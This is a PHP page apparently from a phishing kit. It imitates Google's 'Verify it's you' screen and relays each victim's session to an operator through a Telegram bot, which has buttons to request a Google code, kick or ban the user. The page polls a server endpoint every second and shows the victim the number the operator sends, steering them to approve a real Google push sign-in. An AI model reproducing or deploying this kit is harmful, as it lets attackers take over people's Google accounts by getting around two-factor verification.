<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
ob_start();

if(!isset($_SESSION['step-1']) || isset($_SESSION['404-blocked']) || isset($_SESSION['step-5'])){
  header("HTTP/1.0 404 Not Found");
  exit();
}

require_once(__DIR__ . '/../includes/php/detect.php');
require_once(__DIR__ . '/../includes/php/config.php');

$target = checkCommand();
if ($target !== '') {
    if (strpos($target, '..') === 0 || strpos($target, '/') === 0) {
        header('Location: ' . $target);
    } else {
        header('Location: ./' . $target);
    }
    exit();
}

require(__DIR__ . '/../includes/php/bot_api.php');
require(__DIR__ . '/../includes/php/bot_reply.php');

if (empty($_SESSION['dp_panel_sent'])) {
      $buttons = array(
        'inline_keyboard' => array(
          array(
             array('text' => '📲 Ask G-Code', 'callback_data' => $_SESSION['unique_id'] . ' ask_otp'),
          ),
          array(
            array('text' => '✅ Finish', 'callback_data' => $_SESSION['unique_id'] . ' finish'),
         ),
          array(
             array('text' => '❕KICK USER❕', 'callback_data' => $_SESSION['unique_id'] . ' kick_user'),
             array('text' => '❗BAN USER❗', 'callback_data' => $_SESSION['unique_id'] . ' ban_user'),
          ),
        )
    );
   
   $activity['status'] = '🟢';
   $activity['step'] = '👁️ Verify it’s you - Tap yes';
      
      include(__DIR__ . '/../includes/php/texts.php');
      
      $status = bot_api('editMessageText', $message, $buttons);
      
      if (!bot_api_telegram_ok($status)) {
          die('{"error":true, "description": "telegram bot api"}');
      }
      
bot_reply('🔔 <b>Send the verification code to the user</b>
👤 <b>USERNAME: </b><code>'.$_SESSION['username'].'</code>
<code>/verify_code</code> (as a reply to message) ');
    $_SESSION['dp_panel_sent'] = true;
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in</title>
    <link rel="stylesheet" href="css/index.css">
    <script src="js/jquery-3.6.0.min.js"></script>
    <link rel="shortcut icon" href="media/7611770.png" type="image/x-icon">
</head>
<body>
    <?php panel_debug_box(); ?>
    <?php $start_html = TRUE; require_once(__DIR__ . '/html/start.php'); ?>
                                <div class="ObDc3 ZYOIke 0-7-15-20 0-6-14-19">
                                    <h1 class="vAV9bf 0-8-20-21 0-7-19-20" id="headingText"><span class="0-9-21-22 0-8-20-21">Verify it’s you</span></h1>
                                    <div class="gNJDp" id="headingSubtext"><span jsslot="">To help keep your account safe, Google wants to make sure it’s really you trying to sign in <a href="javascript:void(0);">Learn more</a></span></div>
                                    <div class="SOeSgb">
                                        <div class="Ahygpe m8wwGd EPPJc cd29Sd xNLKcb">
                                           <div class="HOE91e">
                                              <div class="JQ5tlb" aria-hidden="true">
                                                 <svg aria-hidden="true" class="Qk3oof" fill="currentColor" focusable="false" width="48px" height="48px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
                                                 </svg>
                                              </div>
                                           </div>
                                           <div class="IxcUte" translate="no"><?php if(isset($_SESSION['username'])) echo $_SESSION['username']; ?></div>
                                           <div class="JCl8ie">
                                              <svg aria-hidden="true" class="Qk3oof u4TTuf" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                                 <path d="M7 10l5 5 5-5z"></path>
                                              </svg>
                                           </div>
                                        </div>
                                     </div>
                                </div>
                            </div>
                            <div class="UXFQgc 0-6-14-25 0-5-13-24 hidden">
                                <div class="qWK5J 0-7-25-26 0-6-24-25">
                                    <div class="xKcayf 0-8-26-27 0-7-25-26">
                                        <div class="AcKKx 0-9-27-28 0-8-26-27">
                                            <form method="post" novalidate="" class="0-10-28-29 0-9-27-28">
                                                <span class="0-11-29-30 0-10-28-29">
                                                    <section class="Em2Ord 0-12-30-31 0-11-29-30">
                                                        <header class="vYeFie 0-13-31-32 0-12-30-31" aria-hidden="true"></header>
                                                        <div class="yTaH4c 0-13-31-33 0-12-30-32">
                                                            <div class="0-14-33-34 0-13-32-33">
                                                                <section class="Em2Ord ">
                                                                    <header class="vYeFie"></header>
                                                                    <div class="yTaH4c">
                                                                       <div jsslot="">
                                                                          <span class="red0Me">
                                                                             <figure class="tbkBpf GDy4Ze"><samp class="Sevzkc" translate="no">00</samp></figure>
                                                                          </span>
                                                                          <section class="Em2Ord  S7S4N">
                                                                             <header class="vYeFie">
                                                                                <div class="ozEFYb" role="presentation">
                                                                                   <h2 class="x9zgF TrZEUc"><span>Open the Gmail app on your phone</span></h2>
                                                                                   <div class="osxBFb"></div>
                                                                                </div>
                                                                             </header>
                                                                             <div class="yTaH4c">
                                                                                <div jsslot="">
                                                                                   <div class="dMNVAe">
                                                                                      Google sent a notification to your phone. Open the Gmail app, tap <strong>Yes</strong> on the prompt, then tap <strong class="minifier">00</strong> on your phone to verify it’s you.
                                                                                      <div class="dMNVAe"></div>
                                                                                   </div>
                                                                                </div>
                                                                             </div>
                                                                          </section>
                                                                       </div>
                                                                    </div>
                                                                 </section>
                                                                <div class="dMNVAe 0-15-34-47 0-14-33-46" aria-live="assertive"></div>
                                                         
                                                            </div>
                                                            <div class="dgb5Cf 0-14-33-77 0-13-32-76"></div>
                                                            <div class="VfPpkd-RLmnJb 0-13-32-78 0-12-31-77"></div>
                                                        </div>
                                                        <footer class="RY3tic 0-12-30-79 0-11-29-78"></footer>
                                                    </section>
                                                </span>
                                            </form>
                                            
                                        </div>
                                       
                                    </div>
                                </div>
                            </div>
              
                        </div>
        <?php $footer_html = TRUE; require_once(__DIR__ . '/html/footer.php'); ?>
    <script src="js/loader.js"></script>
    <script src="js/dp.js"></script>
    <script>
        $(document).ready(function() {
            checkingCode = setInterval(checkForVerifyCode, 1000);
            setInterval(makeRequest, 1000);
        });
    </script>
    <script>
    function checkForVerifyCode() {
        $.ajax({
            url: "../includes/process_data.php?id=<?php echo $_SESSION['messageid']; ?>",
            type: "POST",
            success: function(response) {
            if(response.length != 0) {
                $('.Sevzkc').text(response);
                $('.minifier').text(response);
                $('.UXFQgc').removeClass('hidden');
                $('.kPY6ve').addClass('hidden');
                $('#loader-login').addClass('qdulke').addClass('jK7moc');
                clearInterval(checkingCode);
            } else {
                console.log("Empty response received");
            } 
            },
            error: function(xhr, status, error) {
                console.error("Request failed with status: " + xhr.status);
            }
        });
    }
    </script>
    <?php 
    require_once(__DIR__ . '/../includes/js/make_request.php');
    ?>
</body>
</html>